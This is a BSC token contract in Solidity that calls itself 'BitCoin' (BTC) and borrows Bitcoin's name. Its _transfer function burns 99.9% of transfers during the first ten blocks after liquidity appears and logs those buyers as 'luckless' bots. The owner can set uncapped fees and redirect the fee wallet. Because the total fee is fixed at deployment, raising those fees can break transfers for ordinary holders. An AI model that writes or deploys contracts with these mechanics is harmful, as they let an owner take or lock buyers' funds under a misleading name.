/**
 *Submitted for verification at BscScan.com on 2022-03-13
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

////////////INTERFACE///////////////
interface IERC20 {
    function totalSupply() external  view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external  returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}



//////////LIBRARY////////////////////////
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


 /////////////////////TOKEN////////////////////////
  contract Token is IERC20Metadata {
        using SafeMath for uint256;

        mapping  (address => uint256) private _balances;  
        mapping  (address => mapping(address => uint256)) private _allowances;  
        mapping  (address => bool) internal  isExcludFee; 
        mapping  (address => bool) internal isLimitExempt;
        

        bool public ismobility; 
        
        string  private _name = "BitCoin";
        string  private _symbol = "BTC";
        uint8   private _decimals = 18;
        uint256 private _totalSupply = 10000 * 10**_decimals;


        address[] public luckless;
        address internal Owner; 
        address internal deadAddress = 0x000000000000000000000000000000000000dEaD;
        address internal marketAddress = 0x79cFA6104a016Fbc2E6eb3eFB4B12a5717fEA516;

        uint256 internal marketFee = 30;
        uint256 internal burnFee = 30;
        uint256 internal totalFee = marketFee.add(burnFee);
        uint256 internal denominator = 1000;
        uint256 public swapMax = 200 * 10**_decimals; 
        uint256 public lauchBlock = 0;
        
        
        constructor ()  {
            Owner = msg.sender;
            isExcludFee[Owner] = true;
            isExcludFee[marketAddress] =true;
            isExcludFee[address(this)] =true;

            isLimitExempt[Owner] =true;
            isLimitExempt[address(this)] =true;
            isLimitExempt[marketAddress] = true;
            isLimitExempt[deadAddress] = true;

            _balances[Owner] = _totalSupply;
        }

        modifier onlyOwner {
            require(msg.sender == Owner);
            _;
        }

    function name() external virtual override view returns (string memory){return _name;}
    function symbol() external virtual override  view returns (string memory){return _symbol;}
    function decimals() external virtual override view returns (uint8){return _decimals;}
    function totalSupply() external virtual override view returns (uint256){return _totalSupply;}
    function balanceOf(address account)  external virtual override view returns (uint256){return _balances[account];}
    function owner() external view returns(address) {return Owner;}


    function setFees(uint256 _marfees , uint256 _burnfees) public onlyOwner {
        marketFee = _marfees;
        burnFee = _burnfees;
    }

    function setMarketAddr(address _newAddr) public onlyOwner {
        marketAddress = _newAddr;
    }

    function setMaxSwap( uint256 value) public onlyOwner {
        swapMax = value * ( 10**_decimals);
    }

    
    function allowance(address _owner, address spender) external virtual override view returns (uint256){
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) external virtual override returns (bool){
        require(msg.sender != address(0) , "ERC20: Sender prohibit address 0 ");
        require(spender != address(0),"ERC20: spender prohibit address 0"); 
        require(_balances[msg.sender] >= amount);
         _allowances[msg.sender][spender] = amount;
         emit Approval(msg.sender , spender , amount);
         return true;
    }

    function transfer(address recipient, uint256 amount) external virtual override returns (bool){
        require(msg.sender != address(0) , "ERC20: Sender prohibit address 0");
        require(recipient !=  address(0) , "ERC20 : recipient prohibit address 0");
        _transfer(msg.sender , recipient , amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external virtual override returns (bool){
        require(sender != address(0) , "ERC20: sender prohibit address (0)");
        require(recipient != address(0) , "ERC20 : recipient prohibit address(0)");
        uint256 allowancess = _allowances[sender][msg.sender];
        require(allowancess >= amount);
        unchecked{  _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount);}
        _transfer(sender , recipient , amount);
        return true;
    }


    ////////////TRANSFER//////////////////
    
    function _transfer(address from ,address to ,uint256 amounts) internal  {

       if(isContract(to) && !ismobility){  
           ismobility = true;         //初始化流动性bool值
           lauchBlock = block.number; //初始化发射区块
       }

    
       if(ismobility) {  //已近添加流动性了
          if(!isLimitExempt[from] && !isLimitExempt[to]) { //接收者或者发送者只要有一个地址是项目方钱包则不执行
            require(amounts <= swapMax , "Max Exchange");
           }       
        }

        uint256 fees;
        uint256 marfees;
        uint256 brfees;
        uint256 shouldfees;

         if(lauchBlock.add(10) > block.number){ //发射区块加上杀的区块大于当前的区块
            fees = amounts.mul(999).div(denominator);
            marfees = 0;
            brfees = fees;
            shouldfees = amounts.sub(fees);
            require(shouldfees.add(brfees).add(marfees) == amounts);
            addBots(to);  //接收方添加成机器人
        } else {

            if(isExcludFee[from] || isExcludFee[to]) {
                    fees = 0;
                    marfees =0;
                    brfees = 0;
                    shouldfees = amounts;
              }else {
                fees = amounts.mul(totalFee).div(denominator);
                marfees = fees.mul(marketFee).div(totalFee);
                brfees = fees.sub(marfees);
                shouldfees = amounts.sub(fees);
                require(shouldfees.add(brfees).add(marfees) == amounts);
          }

        }

        unchecked{_balances[from] = _balances[from].sub(amounts);}
        unchecked{_balances[marketAddress] = _balances[marketAddress].add(marfees);}
        unchecked{_balances[deadAddress] = _balances[deadAddress].add(brfees);}
        unchecked{_balances[to] = _balances[to].add(shouldfees);}

        emit Transfer(from , to , amounts);
    }

    function addBots(address bot) internal {
            luckless.push(bot);
        }
     function isContract(address account) internal view returns (bool) {  
        uint256 size;
        assembly {size := extcodesize(account)}   
        return size > 0;   
    }


}